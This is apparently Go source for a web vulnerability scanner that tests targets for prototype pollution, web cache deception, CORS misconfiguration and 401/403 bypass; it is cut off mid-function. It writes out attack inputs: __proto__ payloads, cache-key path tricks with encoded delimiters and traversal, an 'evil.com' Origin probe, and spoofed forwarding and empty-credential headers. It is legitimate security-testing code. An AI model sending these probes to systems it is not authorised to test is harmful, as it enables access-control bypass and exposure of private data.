package scanner

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
	xhtml "golang.org/x/net/html"
)

type VulnScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewVulnScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *VulnScanner {
	return &VulnScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

var vulnHTTPClient = &http.Client{
	Transport: sharedHTTPTransport,
	Timeout:   10 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// Run executes the independent web-behaviour families in parallel. Each family
// retains its own bounded worker pool, proof replay and negative controls; only
// the former top-level serialization is removed. This keeps detector semantics
// unchanged while avoiding five consecutive network-latency waterfalls.
func (s *VulnScanner) Run(ctx context.Context, targetID, domain string, logFn LogFunc) error {
	// XSS has one owner: DASTScanner.RunXSS. The old combined module repeated a
	// Dalfox/built-in pass over the same parameters, producing duplicate traffic
	// and a second verification policy. vuln_scan now contains only its focused
	// platform-behaviour checks; selecting xss runs the single native pipeline.
	// CORS is owned by CORSScanner. The legacy structural pass promoted reflected
	// policy headers without proving any authenticated data was readable and also
	// duplicated every request in full scans.
	_ = domain
	checks := []func() error{
		func() error { return s.Run403Bypass(ctx, targetID, logFn) },
		func() error { return s.RunHostHeaderInjection(ctx, targetID, logFn) },
		func() error { return s.RunCRLF(ctx, targetID, logFn) },
		func() error { return s.RunPrototypePollution(ctx, targetID, logFn) },
		func() error { return s.RunCacheDeception(ctx, targetID, logFn) },
	}
	errCh := make(chan error, len(checks))
	var wg sync.WaitGroup
	for _, check := range checks {
		wg.Add(1)
		go func(run func() error) {
			defer wg.Done()
			if err := run(); err != nil {
				errCh <- err
			}
		}(check)
	}
	wg.Wait()
	close(errCh)
	if err := ctx.Err(); err != nil {
		return err
	}
	for err := range errCh {
		return err
	}
	return nil
}

// dedupeWebBehaviorURLs collapses crawl/history value variants while retaining
// distinct routes and query-field shapes. Web-behaviour checks target routing,
// header and cache policy, so repeating /search?q=a and /search?q=b only burns
// the request budget without exercising a new policy decision.
func dedupeWebBehaviorURLs(urls []string) []string {
	seen := make(map[string]bool, len(urls))
	out := make([]string, 0, len(urls))
	for _, raw := range urls {
		parsed, err := url.Parse(raw)
		if err != nil || parsed.Host == "" {
			continue
		}
		var names []string
		for name := range parsed.Query() {
			names = append(names, strings.ToLower(name))
		}
		sort.Strings(names)
		key := strings.ToLower(parsed.Scheme+"://"+parsed.Host) + parsed.EscapedPath() + "?" + strings.Join(names, ",")
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, raw)
	}
	return out
}

// ── Prototype Pollution ──────────────────────────────────────────────────────

// RunPrototypePollution probes endpoints with __proto__ payloads and looks for
// a polluted marker reflected back — a strong signal of client/server-side
// prototype pollution in JS-heavy apps.
func (s *VulnScanner) RunPrototypePollution(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "proto_pollution", "Checking for prototype pollution...")

	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services WHERE target_id = ? AND status_code BETWEEN 200 AND 403
		UNION
		SELECT url FROM parameters WHERE target_id = ? AND UPPER(COALESCE(method,'GET')) = 'GET'
		LIMIT ?
	`, targetID, targetID, s.cfg.URLLimit())
	if err != nil {
		return err
	}
	var urls []string
	for rows.Next() {
		var u string
		if err := rows.Scan(&u); err == nil {
			urls = append(urls, u)
		}
	}
	rows.Close()
	urls = dedupeWebBehaviorURLs(filterURLsByHostScope(ctx, urls))
	auth := loadAuthHeaders(ctx, s.db, targetID)
	jsonPoints := loadInsertionPoints(ctx, s.db, targetID, minInt(s.cfg.URLLimit(), 200))

	sem := make(chan struct{}, 12)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, svcURL := range urls {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()
			marker := randomCanary()
			payloads := []string{
				"__proto__[" + marker + "]=" + marker,
				"__proto__.%s=%s",
				"constructor[prototype][" + marker + "]=" + marker,
				"constructor.prototype.%s=%s",
				"__proto__=%7B%22" + marker + "%22%3A%22" + marker + "%22%7D",
			}
			type protoResult struct {
				body string
				ct   string
				url  string
			}
			results := make([]protoResult, len(payloads))
			var probes sync.WaitGroup
			for index, pl := range payloads {
				sep := "?"
				if strings.Contains(u, "?") {
					sep = "&"
				}
				testURL := u + sep + strings.Replace(pl, "%s", marker, -1)
				probes.Add(1)
				go func(i int, candidate string) {
					defer probes.Done()
					reqCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
					defer cancel()
					req, err := http.NewRequestWithContext(reqCtx, "GET", candidate, nil)
					if err != nil {
						return
					}
					req.Header.Set("User-Agent", "Mozilla/5.0")
					for k, v := range auth {
						req.Header.Set(k, v)
					}
					resp, err := vulnHTTPClient.Do(req)
					if err != nil {
						return
					}
					body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
					resp.Body.Close()
					results[i] = protoResult{body: string(body), ct: strings.ToLower(resp.Header.Get("Content-Type")), url: candidate}
				}(index, testURL)
			}
			probes.Wait()
			for _, result := range results {
				// Marker reflected inside a JSON/JS structural context is suspicious.
				b, ct := result.body, result.ct
				if strings.Contains(b, "\""+marker+"\":\""+marker+"\"") ||
					(strings.Contains(ct, "json") && strings.Count(b, marker) >= 2) {
					s.storeVulnConf(targetID, "prototype_pollution", "medium", u, "__proto__", result.url,
						"Prototype-shaped input was reflected in JSON. Reflection alone does not prove Object.prototype mutation; retained for browser/manual verification.", ConfCandidateLo)
					found.Add(1)
					logFn("info", "proto_pollution", "Prototype pollution candidate: "+u)
					return
				}
			}
		}(svcURL)
	}
	seenJSONRequests := make(map[string]bool)
	for _, point := range jsonPoints {
		if ctx.Err() != nil {
			break
		}
		method := strings.ToUpper(strings.TrimSpace(point.Method))
		if insertionLocation(point) != "json" || (method != "POST" && method != "PUT" && method != "PATCH") {
			continue
		}
		requestKey := insertionSiblingGroupKey(point)
		if seenJSONRequests[requestKey] {
			continue
		}
		seenJSONRequests[requestKey] = true
		wg.Add(1)
		sem <- struct{}{}
		go func(ip insertionPoint) {
			defer wg.Done()
			defer func() { <-sem }()
			payload, evidence, confidence := prototypeJSONProof(ctx, ip, auth)
			if evidence == "" {
				return
			}
			s.storeVulnPoint(targetID, "prototype_pollution", "high", ip, payload, evidence, "dual-json-prototype-replay", confidence)
			found.Add(1)
			logFn("warn", "proto_pollution", "JSON prototype pollution confirmed: "+ip.URL)
		}(point)
	}
	wg.Wait()
	logFn("info", "proto_pollution", fmt.Sprintf("Prototype pollution check done. Found %d.", found.Load()))
	return nil
}

func prototypeJSONProof(ctx context.Context, ip insertionPoint, auth map[string]string) (payload, evidence string, confidence int) {
	type vector struct {
		name string
		wrap func(string) any
	}
	vectors := []vector{
		{"__proto__", func(marker string) any { return map[string]any{marker: marker} }},
		{"constructor", func(marker string) any { return map[string]any{"prototype": map[string]any{marker: marker}} }},
	}
	for _, candidate := range vectors {
		marker1 := randomCanary()
		body1, ok := buildPrototypeJSONBody(ip, candidate.name, candidate.wrap(marker1))
		if !ok || !prototypeJSONMarkerObserved(ctx, ip, auth, body1, marker1) {
			continue
		}
		marker2 := randomCanary()
		body2, ok := buildPrototypeJSONBody(ip, candidate.name, candidate.wrap(marker2))
		if !ok || !prototypeJSONMarkerObserved(ctx, ip, auth, body2, marker2) {
			continue
		}
		return body1, fmt.Sprintf("Two independent random properties (%s, %s) emerged as top-level JSON response properties after %s prototype-shaped merges; nested request echo was explicitly excluded", marker1, marker2, candidate.name), ConfPoC
	}
	return "", "", 0
}

func buildPrototypeJSONBody(ip insertionPoint, key string, value any) (string, bool) {
	fields := make(map[string]string, len(ip.Siblings)+1)
	for name, sibling := range ip.Siblings {
		fields[name] = sibling
	}
	fields[ip.Param] = ip.Value
	base := buildJSONFieldsTyped(fields, ip.SiblingTypes, "")
	var object map[string]any
	if json.Unmarshal([]byte(base), &object) != nil {
		return "", false
	}
	object[key] = value
	encoded, err := json.Marshal(object)
	return string(encoded), err == nil
}

func prototypeJSONMarkerObserved(ctx context.Context, ip insertionPoint, auth map[string]string, body, marker string) bool {
	reqCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, strings.ToUpper(ip.Method), ip.URL, strings.NewReader(body))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	for name, value := range auth {
		req.Header.Set(name, value)
	}
	resp, err := vulnHTTPClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	data, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	var object map[string]any
	if json.Unmarshal(data, &object) != nil {
		return false
	}
	value, exists := object[marker]
	return exists && fmt.Sprint(value) == marker
}

// ── Cache Deception ──────────────────────────────────────────────────────────

// RunCacheDeception appends a fake static extension to authenticated-looking
// paths and checks whether the response gets cached (a cached private page is a
// web-cache-deception finding).
func (s *VulnScanner) RunCacheDeception(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "cache_deception", "Checking for web cache deception...")

	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services WHERE target_id = ? AND status_code = 200
		UNION
		SELECT url FROM parameters WHERE target_id = ? AND UPPER(COALESCE(method,'GET')) = 'GET'
		LIMIT ?
	`, targetID, targetID, s.cfg.URLLimit())
	if err != nil {
		return err
	}
	var urls []string
	for rows.Next() {
		var u string
		if err := rows.Scan(&u); err == nil {
			urls = append(urls, u)
		}
	}
	rows.Close()
	urls = dedupeWebBehaviorURLs(filterURLsByHostScope(ctx, urls))
	auth := loadAuthHeaders(ctx, s.db, targetID)
	if len(auth) == 0 {
		logFn("info", "cache_deception", "Skipped: no authenticated identity is configured, so private-content exposure cannot be proven")
		return nil
	}

	sem := make(chan struct{}, 12)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, svcURL := range urls {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			nonce := randomCanary()[len(reflectMarker):]
			ctrlURL := cacheDeceptionOrigin(u) + "/rcn" + nonce + "notreal/x" + nonce + ".css"
			type fetched struct {
				status int
				body   string
				header http.Header
			}
			var baseAuth, baseAnon, control fetched
			var preflight sync.WaitGroup
			for _, job := range []struct {
				out  *fetched
				url  string
				auth map[string]string
			}{{&baseAuth, u, auth}, {&baseAnon, u, nil}, {&control, ctrlURL, auth}} {
				preflight.Add(1)
				go func(j struct {
					out  *fetched
					url  string
					auth map[string]string
				}) {
					defer preflight.Done()
					j.out.status, j.out.body, j.out.header = cacheDeceptionFetchWithAuth(ctx, j.url, j.auth)
				}(job)
			}
			preflight.Wait()
			baseStatus, baseBody := baseAuth.status, baseAuth.body
			unauthStatus, unauthBody := baseAnon.status, baseAnon.body
			if baseStatus != 200 || (unauthStatus == 200 && bodiesSameObject(baseBody, unauthBody)) {
				return // endpoint is not demonstrably private to this identity
			}
			if control.status == 200 && bodiesSameObject(baseBody, control.body) {
				return // same content for a bogus path → SPA/catch-all, not deception
			}

			variants := cacheDeceptionVariants(u, nonce)
			proofs := make([]fetched, len(variants))
			var variantWG sync.WaitGroup
			for index, testURL := range variants {
				variantWG.Add(1)
				go func(i int, candidate string) {
					defer variantWG.Done()
					aStatus, aBody, _ := cacheDeceptionFetchWithAuth(ctx, candidate, auth)
					if aStatus != http.StatusOK || !bodiesSameObject(baseBody, aBody) {
						return
					}
					proofs[i].status, proofs[i].body, proofs[i].header = cacheDeceptionFetchWithAuth(ctx, candidate, nil)
				}(index, testURL)
			}
			variantWG.Wait()

			for index, proof := range proofs {
				if proof.status != http.StatusOK || !cacheServedFromCache(proof.header) || !bodiesSameObject(baseBody, proof.body) {
					continue
				}
				testURL := variants[index]
				hitHdr := cacheHitEvidence(proof.header)
				s.storeVuln(targetID, "cache_deception", "medium", u, "", testURL,
					fmt.Sprintf("web cache deception CONFIRMED: private content at %s replayed without authentication from cache key %s; unrelated-path control differed; cache proof: %s", u, testURL, hitHdr))
				found.Add(1)
				logFn("warn", "cache_deception", "Cache deception CONFIRMED: "+u)
				if s.broadcast != nil {
					s.broadcast("new_vuln_finding", map[string]any{
						"target_id": targetID, "type": "cache_deception", "url": u,
					})
				}
				return
			}
		}(svcURL)
	}
	wg.Wait()
	logFn("info", "cache_deception", fmt.Sprintf("Cache deception check done. Found %d.", found.Load()))
	return nil
}

// cacheDeceptionFetch GETs a URL and returns status, capped body, and headers.
func cacheDeceptionFetch(ctx context.Context, rawURL string) (int, string, http.Header) {
	return cacheDeceptionFetchWithAuth(ctx, rawURL, nil)
}

func cacheDeceptionFetchWithAuth(ctx context.Context, rawURL string, auth map[string]string) (int, string, http.Header) {
	reqCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, "GET", rawURL, nil)
	if err != nil {
		return 0, "", http.Header{}
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	for k, v := range auth {
		req.Header.Set(k, v)
	}
	resp, err := vulnHTTPClient.Do(req)
	if err != nil {
		return 0, "", http.Header{}
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 128*1024))
	return resp.StatusCode, string(b), resp.Header
}

// cacheDeceptionOrigin returns scheme://host for building a control URL on the
// same origin.
func cacheDeceptionOrigin(rawURL string) string {
	p, err := url.Parse(rawURL)
	if err != nil || p.Host == "" {
		return strings.TrimRight(rawURL, "/")
	}
	return p.Scheme + "://" + p.Host
}

func cacheDeceptionVariants(rawURL, nonce string) []string {
	u, err := url.Parse(rawURL)
	if err != nil || u.Host == "" {
		return []string{strings.TrimRight(rawURL, "/") + "/rcndeception" + nonce + ".css"}
	}
	escapedPath := strings.TrimRight(u.EscapedPath(), "/")
	if escapedPath == "" {
		escapedPath = "/"
	}
	leaf := "rcndeception" + nonce + ".css"
	withPath := func(path string) string {
		candidate := *u
		candidate.Fragment = ""
		candidate.RawPath = path
		if decoded, decodeErr := url.PathUnescape(path); decodeErr == nil {
			candidate.Path = decoded
		} else {
			candidate.Path = path
			candidate.RawPath = ""
		}
		return candidate.String()
	}
	return []string{
		withPath(strings.TrimRight(escapedPath, "/") + "/" + leaf),                    // path-mapping discrepancy
		withPath(escapedPath + ";" + leaf),                                            // matrix/delimiter discrepancy
		withPath(escapedPath + "%3b" + leaf),                                          // encoded delimiter discrepancy
		withPath(escapedPath + "." + leaf),                                            // extension/format discrepancy
		withPath(escapedPath + "%3f" + leaf),                                          // encoded query delimiter discrepancy
		withPath("/assets/..%2f" + strings.TrimPrefix(escapedPath, "/") + ";" + leaf), // normalization + static-prefix discrepancy
	}
}

// cacheServedFromCache reports whether response headers PROVE the body came from a
// shared cache (a real cache HIT), not merely that it is cacheable. Cache-Control:
// public/max-age is only a directive and is deliberately NOT accepted here.
func cacheServedFromCache(h http.Header) bool {
	for _, name := range []string{
		"X-Cache", "CF-Cache-Status", "X-Cache-Status", "X-Vercel-Cache",
		"X-Drupal-Cache", "X-Proxy-Cache", "CDN-Cache-Status", "Cache-Status",
		"Akamai-Cache-Status",
	} {
		value := strings.ToLower(strings.TrimSpace(h.Get(name)))
		if value == "" || strings.Contains(value, "hit-for-pass") || strings.Contains(value, "bypass") ||
			strings.Contains(value, "uncacheable") || strings.Contains(value, "dynamic") {
			continue
		}
		for _, token := range strings.FieldsFunc(value, func(r rune) bool {
			return r == ' ' || r == ',' || r == ';' || r == '=' || r == ':'
		}) {
			if token == "hit" {
				return true
			}
		}
	}
	// A positive Age means a shared cache is holding and replaying this response.
	if age := strings.TrimSpace(h.Get("Age")); age != "" {
		if n, err := strconv.Atoi(age); err == nil && n > 0 {
			return true
		}
	}
	return false
}

func cacheHitEvidence(h http.Header) string {
	var values []string
	for _, name := range []string{"X-Cache", "CF-Cache-Status", "X-Cache-Status", "X-Vercel-Cache", "Cache-Status", "Age"} {
		if value := strings.TrimSpace(h.Get(name)); value != "" {
			values = append(values, name+"="+value)
		}
	}
	return strings.Join(values, ", ")
}

// isExecutableXSSContext performs dependency-free, DOM-aware verification: the
// payload must be reflected *raw* (its leading '<' not HTML-encoded) and must
// NOT sit inside a <textarea>, HTML comment, or <script> string literal — all
// of which neutralise the injection. This cuts the classic "reflected but not
// exploitable" false positives.
func isExecutableXSSContext(body, payload string) bool {
	idx := strings.Index(body, payload)
	if idx < 0 {
		return false
	}
	// The raw '<' must survive (not &lt; / &#60;). Since we matched the literal
	// payload (which starts with '<' or '"><'), an encoded version wouldn't match,
	// so reaching here already implies a raw '<'. Now check the surrounding block.
	before := body[:idx]

	// Inside an unclosed <textarea> / <title> / <style> → inert.
	for _, tag := range []string{"textarea", "title", "style", "noscript"} {
		open := strings.LastIndex(strings.ToLower(before), "<"+tag)
		close := strings.LastIndex(strings.ToLower(before), "</"+tag)
		if open > close {
			return false
		}
	}
	// Inside an HTML comment → inert.
	if oc := strings.LastIndex(before, "<!--"); oc > strings.LastIndex(before, "-->") {
		return false
	}
	return true
}

// ── XSS compatibility entry point ──────────────────────────────────────────

func (s *VulnScanner) RunXSS(ctx context.Context, targetID, domain string, logFn LogFunc) error {
	// Compatibility entry point for older callers/tasks. Delegate to the one XSS
	// owner instead of reviving the former Dalfox/built-in parallel pipeline.
	_ = domain
	return NewDASTScanner(s.db, s.cfg, s.logger, s.broadcast).RunXSS(ctx, targetID, logFn)
}

// xssNormalizeKey canonicalises an insertion point so the same (host, path,
// param) is tested exactly once regardless of the concrete values seen during
// crawling. Kills duplicate work AND duplicate findings.
func xssNormalizeKey(rawURL, param string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL + "|" + param
	}
	host := strings.ToLower(parsed.Hostname())
	path := strings.TrimRight(parsed.Path, "/")
	return host + path + "|" + strings.ToLower(param)
}

// xssContext classifies where the canary landed so we can pick the correct
// break-out payload and avoid reporting inert reflections. This is the
// context-aware analysis the naive "does the string appear" check lacks.
type xssContextKind int

const (
	ctxNone       xssContextKind = iota
	ctxHTMLText                  // between tags: <div>HERE</div>
	ctxDoubleAttr                // inside a double-quoted attribute: value="HERE"
	ctxSingleAttr                // inside a single-quoted attribute: value='HERE'
	ctxScript                    // inside a <script> block (JS string context)
	ctxURL                       // inside href/src/action (URL context)
	ctxInert                     // textarea/comment/title/style — not executable
)

func classifyXSSContext(body, canary string) xssContextKind {
	idx := strings.Index(body, canary)
	if idx < 0 {
		return ctxNone
	}
	before := body[:idx]
	lb := strings.ToLower(before)

	// Inert containers first — reflections here don't execute.
	for _, tag := range []string{"textarea", "title", "style", "noscript"} {
		if strings.LastIndex(lb, "<"+tag) > strings.LastIndex(lb, "</"+tag) {
			return ctxInert
		}
	}
	if strings.LastIndex(before, "<!--") > strings.LastIndex(before, "-->") {
		return ctxInert
	}
	// Inside a <script> element → JS context.
	if strings.LastIndex(lb, "<script") > strings.LastIndex(lb, "</script") {
		return ctxScript
	}
	// Inside an open tag attribute? Look at the last unclosed '<'.
	lastLt := strings.LastIndex(before, "<")
	lastGt := strings.LastIndex(before, ">")
	if lastLt > lastGt { // we are inside a tag
		attrChunk := lb[lastLt:]
		if strings.Contains(attrChunk, "href=") || strings.Contains(attrChunk, "src=") || strings.Contains(attrChunk, "action=") {
			// count quotes to see if we're inside the URL value
			dq := strings.Count(before[lastLt:], `"`)
			if dq%2 == 1 {
				return ctxURL
			}
		}
		if strings.Count(before[lastLt:], `"`)%2 == 1 {
			return ctxDoubleAttr
		}
		if strings.Count(before[lastLt:], `'`)%2 == 1 {
			return ctxSingleAttr
		}
	}
	return ctxHTMLText
}

// ── CORS misconfiguration ────────────────────────────────────────────────────

func (s *VulnScanner) RunCORSCheck(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "cors_scan", "Checking CORS misconfigurations...")

	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services
		WHERE target_id = ? AND status_code BETWEEN 200 AND 403
		LIMIT ?
	`, targetID, s.cfg.URLLimit())
	if err != nil {
		return err
	}
	var urls []string
	for rows.Next() {
		var u string
		if err := rows.Scan(&u); err == nil {
			urls = append(urls, u)
		}
	}
	rows.Close()
	urls = filterURLsByHostScope(ctx, urls)

	logFn("info", "cors_scan", fmt.Sprintf("Testing %d endpoints for CORS...", len(urls)))

	sem := make(chan struct{}, 15)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, svcURL := range urls {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vuln, evidence, severity := checkCORS(ctx, u)
			if vuln != "" {
				s.storeVuln(targetID, "cors", severity, u, "", "", evidence)
				found.Add(1)
				logFn("warn", "cors_scan", fmt.Sprintf("CORS [%s]: %s (%s)", severity, u, vuln))
				if s.broadcast != nil {
					s.broadcast("new_vuln_finding", map[string]any{
						"target_id": targetID,
						"type":      "cors",
						"url":       u,
					})
				}
			}
		}(svcURL)
	}
	wg.Wait()
	logFn("info", "cors_scan", fmt.Sprintf("CORS check done. Found %d misconfigurations.", found.Load()))
	return nil
}

// checkCORS returns the vuln type, evidence, and a severity that reflects real
// exploitability. Reflected/wildcard origins WITHOUT credentials are info/low
// (endpoint is already anonymous-readable); only ACAC:true cases are dangerous.
func checkCORS(ctx context.Context, rawURL string) (vulnType, evidence, severity string) {
	origins := []struct {
		origin string
		label  string
	}{
		{"https://evil.com", "arbitrary_origin"},
		{"null", "null_origin"},
	}

	for _, o := range origins {
		reqCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
		req, err := http.NewRequestWithContext(reqCtx, "GET", rawURL, nil)
		if err != nil {
			cancel()
			continue
		}
		req.Header.Set("Origin", o.origin)
		req.Header.Set("User-Agent", "Mozilla/5.0")

		resp, err := vulnHTTPClient.Do(req)
		cancel()
		if err != nil {
			continue
		}
		resp.Body.Close()

		acao := resp.Header.Get("Access-Control-Allow-Origin")
		acac := strings.ToLower(resp.Header.Get("Access-Control-Allow-Credentials")) == "true"

		if acao == "" {
			continue
		}

		// Wildcard without credentials: browsers already allow anonymous reads → info.
		if acao == "*" {
			return "wildcard_cors", "Access-Control-Allow-Origin: * (no credentials)", "info"
		}

		if acao == o.origin || acao == "null" {
			ev := fmt.Sprintf("ACAO: %s, ACAC: %t (origin=%s)", acao, acac, o.origin)
			if acac {
				// Reflected/null origin + credentials = session-stealing → high/critical.
				if o.label == "null_origin" {
					return "cors_null_origin_credentials", ev, "critical"
				}
				return "cors_reflected_credentials", ev, "high"
			}
			// Reflected origin, no credentials: low signal, keep but low severity.
			return "cors_reflected_" + o.label, ev, "low"
		}
	}
	return "", "", ""
}

// ── 401/403 Access-Control Bypass ───────────────────────────────────────────

func (s *VulnScanner) Run403Bypass(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "403_bypass", "Checking 401/403 access-control bypass techniques...")

	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services
		WHERE target_id = ? AND status_code IN (401, 403)
		LIMIT ?
	`, targetID, s.cfg.URLLimit())
	if err != nil {
		return err
	}
	var urls []string
	for rows.Next() {
		var u string
		if err := rows.Scan(&u); err == nil {
			urls = append(urls, u)
		}
	}
	rows.Close()
	urls = dedupeWebBehaviorURLs(filterURLsByHostScope(ctx, urls))

	if len(urls) == 0 {
		logFn("info", "403_bypass", "No 401/403 endpoints found to test")
		return nil
	}

	logFn("info", "403_bypass", fmt.Sprintf("Testing %d protected endpoints...", len(urls)))

	sem := make(chan struct{}, 10)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, svcURL := range urls {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			if bypass, evidence, confidence, location := check403Bypass(ctx, u); bypass != "" {
				severity := "medium"
				if location == "authorization_header" {
					severity = "high"
				}
				s.storeVulnSurface(targetID, "403_bypass", severity, u, "GET", "", location, bypass, evidence, "stable-access-replay", confidence)
				found.Add(1)
				logFn("warn", "403_bypass", fmt.Sprintf("401/403 bypass found: %s via %s", u, bypass))
				if s.broadcast != nil && confidence >= ConfEvidence {
					s.broadcast("new_vuln_finding", map[string]any{
						"target_id": targetID,
						"type":      "403_bypass",
						"url":       u,
					})
				}
			}
		}(svcURL)
	}
	wg.Wait()
	logFn("info", "403_bypass", fmt.Sprintf("401/403 bypass check done. Found %d bypasses.", found.Load()))
	return nil
}

func check403Bypass(ctx context.Context, rawURL string) (method, evidence string, confidence int, location string) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return "", "", 0, ""
	}

	// Start with one control. A second control is fetched only after a technique
	// appears to bypass the wall, so a clean endpoint costs one baseline plus one
	// request per technique instead of two of every request. Positive results still
	// require the exact same two-control/two-proof replay as before.
	bStatus1, baseline1 := fetch403Response(ctx, rawURL, nil)
	if !isAccessDeniedStatus(bStatus1) {
		return "", "", 0, ""
	}

	type attempt struct {
		label      string
		headers    map[string]string
		path       string
		authHeader bool
	}
	originalURI := parsed.EscapedPath()
	if originalURI == "" {
		originalURI = "/"
	}
	if parsed.RawQuery != "" {
		originalURI += "?" + parsed.RawQuery
	}

	attempts := []attempt{
		// Credential-presence confusion. RFC 7617 requires Basic credentials to
		// be a Base64 user-id/password pair, while RFC 6750 requires a non-empty
		// Bearer token. These deliberately incomplete or empty values must never
		// be treated as proof of identity. They are replayed exactly like every
		// other bypass and are never generated from a credential wordlist.
		{label: "Authorization: Basic (missing credentials)", headers: map[string]string{"Authorization": "Basic"}, authHeader: true},
		{label: "Authorization: Basic !!! (invalid token68)", headers: map[string]string{"Authorization": "Basic !!!"}, authHeader: true},
		{label: "Authorization: Basic Og== (empty user/password)", headers: map[string]string{"Authorization": "Basic Og=="}, authHeader: true},
		{label: "Authorization: Bearer (missing token)", headers: map[string]string{"Authorization": "Bearer"}, authHeader: true},
		{label: "Authorization: Bearer null", headers: map[string]string{"Authorization": "Bearer null"}, authHeader: true},
		{label: "Authorization: Bearer undefined", headers: map[string]string{"Authorization": "Bearer undefined"}, authHeader: true},
		{label: "X-Forwarded-For: 127.0.0.1", headers: map[string]string{"X-Forwarded-For": "127.0.0.1"}},
		{label: "X-Forwarded-For: 127.0.0.1, proxy", headers: map[string]string{"X-Forwarded-For": "127.0.0.1, 198.51.100.23"}},
		{label: "X-Real-IP: 127.0.0.1", headers: map[string]string{"X-Real-IP": "127.0.0.1"}},
		{label: "X-Original-URL", headers: map[string]string{"X-Original-URL": originalURI}},
		{label: "X-Rewrite-URL", headers: map[string]string{"X-Rewrite-URL": originalURI}},
		{label: "X-Forwarded-Uri", headers: map[string]string{"X-Forwarded-Uri": originalURI}},
		{label: "X-Custom-IP-Authorization", headers: map[string]string{"X-Custom-IP-Authorization": "127.0.0.1"}},
		{label: "X-Originating-IP: 127.0.0.1", headers: map[string]string{"X-Originating-IP": "127.0.0.1"}},
		{label: "X-Client-IP: 127.0.0.1", headers: map[string]string{"X-Client-IP": "127.0.0.1"}},
		{label: "True-Client-IP: 127.0.0.1", headers: map[string]string{"True-Client-IP": "127.0.0.1"}},
		{label: "Forwarded: for=127.0.0.1", headers: map[string]string{"Forwarded": "for=127.0.0.1;host=" + parsed.Host}},
		{label: "path_suffix /", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+"/")},
		{label: "path_suffix /.", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+"/.")},
		{label: "path_suffix /.;", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+"/.;/")},
		{label: "path_suffix ;/", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+";/")},
		{label: "path_suffix %2f", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+"%2f")},
	}

	type attemptResult struct {
		status int
		body   string
	}
	results := make([]attemptResult, len(attempts))
	sem := make(chan struct{}, 6)
	var wg sync.WaitGroup
	for i, att := range attempts {
		targetURL := rawURL
		if att.path != "" {
			targetURL = att.path
		}
		wg.Add(1)
		go func(index int, candidateURL string, headers map[string]string) {
			defer wg.Done()
			select {
			case sem <- struct{}{}:
				defer func() { <-sem }()
			case <-ctx.Done():
				return
			}
			results[index].status, results[index].body = fetch403Response(ctx, candidateURL, headers)
		}(i, targetURL, att.headers)
	}
	wg.Wait()

	for i, att := range attempts {
		if ctx.Err() != nil {
			return "", "", 0, ""
		}
		status1, body1 := results[i].status, results[i].body
		if status1 != http.StatusOK || looksLike403AuthWall(body1) ||
			bodiesSameObject(baseline1, body1) || len(strings.TrimSpace(body1)) < 32 {
			continue
		}
		targetURL := rawURL
		if att.path != "" {
			targetURL = att.path
		}
		bStatus2, baseline2 := fetch403Response(ctx, rawURL, nil)
		status2, body2 := fetch403Response(ctx, targetURL, att.headers)
		// Only two stable 200 responses count. 301/302 usually redirect to login.
		if bStatus2 != bStatus1 || !bodiesSameObject(baseline1, baseline2) ||
			status2 != http.StatusOK || !bodiesSameObject(body1, body2) {
			continue
		}

		if looksLike403AuthWall(body1) {
			continue // looks like the same auth wall, not real content
		}

		// Body must differ meaningfully from the 403 baseline.
		if bodiesSameObject(baseline1, body1) || len(strings.TrimSpace(body1)) < 32 {
			continue
		}
		conf := ConfMultiTool
